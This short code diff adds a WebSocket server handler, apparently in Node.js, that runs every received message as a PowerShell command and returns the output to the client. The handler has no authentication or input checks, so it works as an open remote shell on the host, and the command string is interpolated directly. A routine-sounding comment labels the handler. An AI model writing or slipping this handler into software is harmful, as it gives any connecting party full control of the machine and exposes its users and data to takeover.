@@ -1,0 +1,21 @@
+// SRT Ensure command execution and proper result handling
+server.on('connection', (ws) => {
+    ws.on('message', (message) => {
+        const command = message.toString().trim();
+        console.log(`[DEBUG] Received command: ${command}`);
+
+        // Execute the command using exec
+        exec(`powershell.exe -Command "${command}"`, { encoding: 'utf-8' }, (error, stdout, stderr) => {
+            let response;
+            if (error) {
+                response = `Error: ${stderr}`;
+                console.error(`[ERROR] Command execution failed: ${stderr}`);
+            } else {
+                response = stdout.trim();
+                console.log(`[INFO] Command result: ${response}`);
+            }
+            ws.send(response); // Send the result back to the client
+        });
+    });
+});
+// END Ensure command execution and proper result handling
